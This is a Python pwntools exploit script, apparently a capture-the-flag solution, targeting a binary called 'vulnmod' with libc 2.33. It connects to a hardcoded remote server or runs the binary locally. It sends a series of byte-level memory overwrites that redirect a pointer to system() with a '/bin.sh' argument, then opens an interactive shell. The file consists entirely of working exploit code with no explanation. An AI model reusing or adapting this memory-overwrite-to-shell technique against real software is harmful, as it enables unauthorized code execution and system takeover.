#!/usr/bin/python

from pwn import *
import sys

remote_ip, port = '65.108.176.61', 55557
binary = './vulnmod'
brkpts = '''
b exit
c
'''

# 0x00007ffff7fbc328

elf = ELF("vulnmod")
libc = ELF("libc-2.33.so")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
# context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(str(a))
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8, chr(0)))

if len(sys.argv) > 1 and sys.argv[1] == "-r":
    io = remote(remote_ip, port)
    context.noptrace = True

elif len(sys.argv) > 1:
    io = gdb.debug(binary, brkpts, env = {'LD_PRELOAD' : './libc-2.33.so'})

else:
    io = process(binary, env = {'LD_PRELOAD' : './libc-2.33.so'})


if __name__ == "__main__":
    sl(hex(0xffffff))

    overwrites = dict()

    # ptr_off = 0x1697ef88 - 0x5000
    ptr_off = 0x1207f88
    system = 0xe43de0
    for i in range(3):
        overwrites[hex(ptr_off + i)] = hex((system >> 8*i) & 0xff)

    # arg_off = 0x1697e978 - 0x5000
    arg_off = 0x1207968

    binsh = u64("/bin.sh\x00")
    for i in range(7):
        overwrites[hex(arg_off + i)] = hex((binsh >> 8*i) & 0xff)

    sl(hex(len(overwrites)))

    for k, v in overwrites.items():
        sl("{} {}".format(k, v))

    io.interactive()
